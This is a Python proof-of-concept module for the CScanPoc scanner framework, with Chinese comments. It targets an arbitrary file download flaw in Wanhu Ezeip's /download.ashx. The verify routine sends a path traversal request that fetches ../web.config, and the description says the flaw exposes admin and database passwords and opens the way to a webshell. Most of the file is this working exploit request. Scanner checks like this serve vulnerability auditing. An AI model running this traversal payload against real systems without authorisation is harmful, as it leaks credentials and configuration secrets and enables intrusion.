# coding: utf-8
import requests
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ezeip_0101' # 平台漏洞编号，留空
    name = '万户Ezeip /download.ashx 任意文件下载' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-08-18'  # 漏洞公布时间
    desc = '''
    万户Ezeip任意文件下载漏，可以获取管理员账号，密码明文、数据库密码明文、配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL ...
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2010-057764
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ezeip(万户)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aaca8beb-996d-44fb-bab4-94ae4346bdee' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            url = self.target
            verify_url = ('%s/download.ashx?files=../web.config') %url
            req = requests.get(verify_url)
            if req.status_code == 200 and '<?xml version=' in req.content:
                if 'configuration' in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()